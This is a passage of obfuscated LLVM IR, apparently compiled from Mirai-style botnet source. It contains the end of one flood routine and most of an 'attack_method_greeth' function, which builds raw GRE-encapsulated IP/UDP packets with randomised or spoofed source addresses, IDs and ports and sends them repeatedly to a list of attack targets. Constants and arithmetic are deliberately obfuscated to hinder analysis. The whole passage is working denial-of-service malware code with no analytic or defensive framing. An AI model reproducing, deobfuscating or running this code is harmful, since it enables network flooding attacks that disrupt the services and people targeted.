  %497 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %498 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %499 = bitcast %struct.udphdr* %498 to i8*
  %500 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 2
  %502 = load i16, i16* %501, align 2
  %503 = load i32, i32* %18, align 4
  %504 = sext i32 %503 to i64
  %505 = add i64 8, -1848039303476554373
  %506 = add i64 %505, %504
  %507 = sub i64 %506, -1848039303476554373
  %508 = add i64 8, %504
  %509 = trunc i64 %507 to i32
  %510 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %497, i8* %499, i16 zeroext %502, i32 %509)
  %511 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %512 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %511, i32 0, i32 3
  store i16 %510, i16* %512, align 2
  %513 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %514 = load i32, i32* %9, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %513, i64 %515
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i32 0, i32 0
  %518 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %517, i32 0, i32 0
  store i16 2, i16* %518, align 4
  %519 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 9
  %521 = load i32, i32* %520, align 4
  %522 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %523 = load i32, i32* %9, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %522, i64 %524
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %525, i32 0, i32 0
  %527 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %526, i32 0, i32 2
  %528 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %527, i32 0, i32 0
  store i32 %521, i32* %528, align 4
  %529 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %530 = load i32, i32* %9, align 4
  %531 = sext i32 %530 to i64
  %532 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %529, i64 %531
  %533 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i32 0, i32 0
  %534 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %533, i32 0, i32 1
  store i16 0, i16* %534, align 2
  %535 = load i32, i32* %10, align 4
  %536 = load i8*, i8** %26, align 8
  %537 = load i32, i32* %18, align 4
  %538 = sext i32 %537 to i64
  %539 = sub i64 0, %538
  %540 = sub i64 52, %539
  %541 = add i64 52, %538
  %542 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = bitcast %struct.sockaddr_in* %547 to %struct.sockaddr*
  store %struct.sockaddr* %548, %struct.sockaddr** %542, align 8
  %549 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %550 = load %struct.sockaddr*, %struct.sockaddr** %549, align 8
  %551 = call i64 @sendto(i32 %535, i8* %536, i64 %540, i32 16384, %struct.sockaddr* %550, i32 16)
  br label %552

; <label>:552:                                    ; preds = %480
  %553 = load i32, i32* %9, align 4
  %554 = sub i32 0, %553
  %555 = sub i32 0, 1
  %556 = add i32 %554, %555
  %557 = sub i32 0, %556
  %558 = add nsw i32 %553, 1
  store i32 %557, i32* %9, align 4
  br label %337

; <label>:559:                                    ; preds = %337
  br label %336

; <label>:560:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 1458)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %599

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %599

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %335, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %341

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 %127, -1
  %129 = xor i8 15, -1
  %130 = xor i8 -30, -1
  %131 = or i8 %128, %129
  %132 = or i8 -30, %130
  %133 = xor i8 %131, -1
  %134 = and i8 %133, %132
  %135 = and i8 %127, 15
  %136 = xor i8 %134, -1
  %137 = xor i8 64, -1
  %138 = xor i8 -25, -1
  %139 = and i8 %136, -25
  %140 = and i8 %134, %138
  %141 = and i8 %137, -25
  %142 = and i8 64, %138
  %143 = or i8 %139, %140
  %144 = or i8 %141, %142
  %145 = xor i8 %143, %144
  %146 = or i8 %136, %137
  %147 = xor i8 %146, -1
  %148 = or i8 -25, %138
  %149 = and i8 %147, %148
  %150 = or i8 %145, %149
  %151 = or i8 %134, 64
  store i8 %150, i8* %126, align 4
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = bitcast %struct.iphdr* %152 to i8*
  %154 = load i8, i8* %153, align 4
  %155 = xor i8 -16, -1
  %156 = xor i8 %154, %155
  %157 = and i8 %156, %154
  %158 = and i8 %154, -16
  %159 = xor i8 %157, -1
  %160 = xor i8 5, -1
  %161 = xor i8 73, -1
  %162 = and i8 %159, 73
  %163 = and i8 %157, %161
  %164 = and i8 %160, 73
  %165 = and i8 5, %161
  %166 = or i8 %162, %163
  %167 = or i8 %164, %165
  %168 = xor i8 %166, %167
  %169 = or i8 %159, %160
  %170 = xor i8 %169, -1
  %171 = or i8 73, %161
  %172 = and i8 %170, %171
  %173 = or i8 %168, %172
  %174 = or i8 %157, 5
  store i8 %173, i8* %153, align 4
  %175 = load i8, i8* %12, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 1
  store i8 %175, i8* %177, align 1
  %178 = load i32, i32* %18, align 4
  %179 = sext i32 %178 to i64
  %180 = sub i64 66, -4658812112249707726
  %181 = add i64 %180, %179
  %182 = add i64 %181, -4658812112249707726
  %183 = add i64 66, %179
  %184 = trunc i64 %182 to i16
  %185 = call zeroext i16 @htons(i16 zeroext %184) #7
  %186 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 2
  store i16 %185, i16* %187, align 2
  %188 = load i16, i16* %13, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 3
  store i16 %189, i16* %191, align 4
  %192 = load i8, i8* %14, align 1
  %193 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %194 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %193, i32 0, i32 5
  store i8 %192, i8* %194, align 4
  %195 = load i8, i8* %15, align 1
  %196 = icmp ne i8 %195, 0
  br i1 %196, label %197, label %201

; <label>:197:                                    ; preds = %101
  %198 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %199 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %200 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %199, i32 0, i32 4
  store i16 %198, i16* %200, align 2
  br label %201

; <label>:201:                                    ; preds = %197, %101
  %202 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 6
  store i8 47, i8* %203, align 1
  %204 = load i32, i32* %21, align 4
  %205 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 8
  store i32 %204, i32* %206, align 4
  %207 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %208 = load i32, i32* %9, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %207, i64 %209
  %211 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %210, i32 0, i32 1
  %212 = load i32, i32* %211, align 4
  %213 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 9
  store i32 %212, i32* %214, align 4
  %215 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %216 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %217 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %216, i32 0, i32 1
  store i16 %215, i16* %217, align 2
  %218 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %219 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %220 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %219, i32 0, i32 2
  store i16 %218, i16* %220, align 1
  %221 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %222 = bitcast %struct.iphdr* %221 to i8*
  %223 = load i8, i8* %222, align 4
  %224 = xor i8 15, -1
  %225 = xor i8 %223, %224
  %226 = and i8 %225, %223
  %227 = and i8 %223, 15
  %228 = and i8 %226, 64
  %229 = xor i8 %226, 64
  %230 = or i8 %228, %229
  %231 = or i8 %226, 64
  store i8 %230, i8* %222, align 4
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = bitcast %struct.iphdr* %232 to i8*
  %234 = load i8, i8* %233, align 4
  %235 = xor i8 -16, -1
  %236 = xor i8 %234, %235
  %237 = and i8 %236, %234
  %238 = and i8 %234, -16
  %239 = and i8 %237, 5
  %240 = xor i8 %237, 5
  %241 = or i8 %239, %240
  %242 = or i8 %237, 5
  store i8 %241, i8* %233, align 4
  %243 = load i8, i8* %12, align 1
  %244 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 1
  store i8 %243, i8* %245, align 1
  %246 = load i32, i32* %18, align 4
  %247 = sext i32 %246 to i64
  %248 = sub i64 28, 6337298624889485973
  %249 = add i64 %248, %247
  %250 = add i64 %249, 6337298624889485973
  %251 = add i64 28, %247
  %252 = trunc i64 %250 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 2
  store i16 %253, i16* %255, align 2
  %256 = load i16, i16* %13, align 2
  %257 = zext i16 %256 to i32
  %258 = xor i32 %257, -1
  %259 = and i32 1984515290, %258
  %260 = xor i32 1984515290, -1
  %261 = and i32 %257, %260
  %262 = xor i32 -1, -1
  %263 = and i32 %262, 1984515290
  %264 = and i32 -1, %260
  %265 = or i32 %259, %261
  %266 = or i32 %263, %264
  %267 = xor i32 %265, %266
  %268 = xor i32 %257, -1
  %269 = trunc i32 %267 to i16
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 3
  store i16 %270, i16* %272, align 4
  %273 = load i8, i8* %14, align 1
  %274 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 5
  store i8 %273, i8* %275, align 4
  %276 = load i8, i8* %15, align 1
  %277 = icmp ne i8 %276, 0
  br i1 %277, label %278, label %282

; <label>:278:                                    ; preds = %201
  %279 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %280 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 4
  store i16 %279, i16* %281, align 2
  br label %282

; <label>:282:                                    ; preds = %278, %201
  %283 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %284 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %283, i32 0, i32 6
  store i8 17, i8* %284, align 1
  %285 = call i32 @rand_next()
  %286 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 8
  store i32 %285, i32* %287, align 4
  %288 = load i8, i8* %20, align 1
  %289 = icmp ne i8 %288, 0
  br i1 %289, label %290, label %296

; <label>:290:                                    ; preds = %282
  %291 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 9
  %293 = load i32, i32* %292, align 4
  %294 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i32 0, i32 9
  store i32 %293, i32* %295, align 4
  br label %316

; <label>:296:                                    ; preds = %282
  %297 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 8
  %299 = load i32, i32* %298, align 4
  %300 = sub i32 0, 1024
  %301 = add i32 %299, %300
  %302 = sub i32 %299, 1024
  %303 = xor i32 %301, -1
  %304 = and i32 -150959401, %303
  %305 = xor i32 -150959401, -1
  %306 = and i32 %301, %305
  %307 = xor i32 -1, -1
  %308 = and i32 %307, -150959401
  %309 = and i32 -1, %305
  %310 = or i32 %304, %306
  %311 = or i32 %308, %309
  %312 = xor i32 %310, %311
  %313 = xor i32 %301, -1
  %314 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 9
  store i32 %312, i32* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %296, %290
  %317 = load i16, i16* %16, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 0
  store i16 %318, i16* %320, align 2
  %321 = load i16, i16* %17, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %18, align 4
  %326 = sext i32 %325 to i64
  %327 = add i64 8, -5205124413641184485
  %328 = add i64 %327, %326
  %329 = sub i64 %328, -5205124413641184485
  %330 = add i64 8, %326
  %331 = trunc i64 %329 to i16
  %332 = call zeroext i16 @htons(i16 zeroext %331) #7
  %333 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %334 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %333, i32 0, i32 2
  store i16 %332, i16* %334, align 2
  br label %335

; <label>:335:                                    ; preds = %316
  %336 = load i32, i32* %9, align 4
  %337 = add i32 %336, 745337208
  %338 = add i32 %337, 1
  %339 = sub i32 %338, 745337208
  %340 = add nsw i32 %336, 1
  store i32 %339, i32* %9, align 4
  br label %96

; <label>:341:                                    ; preds = %96
  br label %342

; <label>:342:                                    ; preds = %598, %341
  store i32 0, i32* %9, align 4
  br label %343

; <label>:343:                                    ; preds = %593, %342
  %344 = load i32, i32* %9, align 4
  %345 = load i8, i8* %5, align 1
  %346 = zext i8 %345 to i32
  %347 = icmp slt i32 %344, %346
  br i1 %347, label %348, label %598

; <label>:348:                                    ; preds = %343
  %349 = load i8**, i8*** %11, align 8
  %350 = load i32, i32* %9, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds i8*, i8** %349, i64 %351
  %353 = load i8*, i8** %352, align 8
  store i8* %353, i8** %30, align 8
  %354 = load i8*, i8** %30, align 8
  %355 = bitcast i8* %354 to %struct.iphdr*
  store %struct.iphdr* %355, %struct.iphdr** %31, align 8
  %356 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i64 1
  %358 = bitcast %struct.iphdr* %357 to %struct.grehdr*
  store %struct.grehdr* %358, %struct.grehdr** %32, align 8
  %359 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %360 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %359, i64 1
  %361 = bitcast %struct.grehdr* %360 to %struct.ethhdr*
  store %struct.ethhdr* %361, %struct.ethhdr** %33, align 8
  %362 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %363 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %362, i64 1
  %364 = bitcast %struct.ethhdr* %363 to %struct.iphdr*
  store %struct.iphdr* %364, %struct.iphdr** %34, align 8
  %365 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %366 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %365, i64 1
  %367 = bitcast %struct.iphdr* %366 to %struct.udphdr*
  store %struct.udphdr* %367, %struct.udphdr** %35, align 8
  %368 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %369 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %368, i64 1
  %370 = bitcast %struct.udphdr* %369 to i8*
  store i8* %370, i8** %36, align 8
  %371 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %372 = load i32, i32* %9, align 4
  %373 = sext i32 %372 to i64
  %374 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i64 %373
  %375 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %374, i32 0, i32 2
  %376 = load i8, i8* %375, align 4
  %377 = zext i8 %376 to i32
  %378 = icmp slt i32 %377, 32
  br i1 %378, label %379, label %403

; <label>:379:                                    ; preds = %348
  %380 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %381 = load i32, i32* %9, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %380, i64 %382
  %384 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %383, i32 0, i32 1
  %385 = load i32, i32* %384, align 4
  %386 = call i32 @ntohl(i32 %385) #7
  %387 = call i32 @rand_next()
  %388 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %389 = load i32, i32* %9, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %388, i64 %390
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %391, i32 0, i32 2
  %393 = load i8, i8* %392, align 4
  %394 = zext i8 %393 to i32
  %395 = lshr i32 %387, %394
  %396 = sub i32 %386, -1407109587
  %397 = add i32 %396, %395
  %398 = add i32 %397, -1407109587
  %399 = add i32 %386, %395
  %400 = call i32 @htonl(i32 %398) #7
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 9
  store i32 %400, i32* %402, align 4
  br label %403

; <label>:403:                                    ; preds = %379, %348
  %404 = load i32, i32* %21, align 4
  %405 = icmp eq i32 %404, -1
  br i1 %405, label %406, label %410

; <label>:406:                                    ; preds = %403
  %407 = call i32 @rand_next()
  %408 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 8
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %406, %403
  %411 = load i16, i16* %13, align 2
  %412 = zext i16 %411 to i32
  %413 = icmp eq i32 %412, 65535
  br i1 %413, label %414, label %449

; <label>:414:                                    ; preds = %410
  %415 = call i32 @rand_next()
  %416 = xor i32 %415, -1
  %417 = xor i32 65535, -1
  %418 = xor i32 1571693487, -1
  %419 = or i32 %416, %417
  %420 = or i32 1571693487, %418
  %421 = xor i32 %419, -1
  %422 = and i32 %421, %420
  %423 = and i32 %415, 65535
  %424 = trunc i32 %422 to i16
  %425 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 3
  store i16 %424, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 3
  %429 = load i16, i16* %428, align 4
  %430 = zext i16 %429 to i32
  %431 = add i32 %430, -1316737801
  %432 = sub i32 %431, 1000
  %433 = sub i32 %432, -1316737801
  %434 = sub nsw i32 %430, 1000
  %435 = xor i32 %433, -1
  %436 = and i32 369342323, %435
  %437 = xor i32 369342323, -1
  %438 = and i32 %433, %437
  %439 = xor i32 -1, -1
  %440 = and i32 %439, 369342323
  %441 = and i32 -1, %437
  %442 = or i32 %436, %438
  %443 = or i32 %440, %441
  %444 = xor i32 %442, %443
  %445 = xor i32 %433, -1
  %446 = trunc i32 %444 to i16
  %447 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 3
  store i16 %446, i16* %448, align 4
  br label %449

; <label>:449:                                    ; preds = %414, %410
  %450 = load i16, i16* %16, align 2
  %451 = zext i16 %450 to i32
  %452 = icmp eq i32 %451, 65535
  br i1 %452, label %453, label %466

; <label>:453:                                    ; preds = %449
  %454 = call i32 @rand_next()
  %455 = xor i32 %454, -1
  %456 = xor i32 65535, -1
  %457 = xor i32 296739526, -1
  %458 = or i32 %455, %456
  %459 = or i32 296739526, %457
  %460 = xor i32 %458, -1
  %461 = and i32 %460, %459
  %462 = and i32 %454, 65535
  %463 = trunc i32 %461 to i16
  %464 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %465 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %464, i32 0, i32 0
  store i16 %463, i16* %465, align 2
  br label %466

; <label>:466:                                    ; preds = %453, %449
  %467 = load i16, i16* %17, align 2
  %468 = zext i16 %467 to i32
  %469 = icmp eq i32 %468, 65535
  br i1 %469, label %470, label %479

; <label>:470:                                    ; preds = %466
  %471 = call i32 @rand_next()
  %472 = xor i32 65535, -1
  %473 = xor i32 %471, %472
  %474 = and i32 %473, %471
  %475 = and i32 %471, 65535
  %476 = trunc i32 %474 to i16
  %477 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %478 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %477, i32 0, i32 1
  store i16 %476, i16* %478, align 2
  br label %479

; <label>:479:                                    ; preds = %470, %466
  %480 = load i8, i8* %20, align 1
  %481 = icmp ne i8 %480, 0
  br i1 %481, label %486, label %482

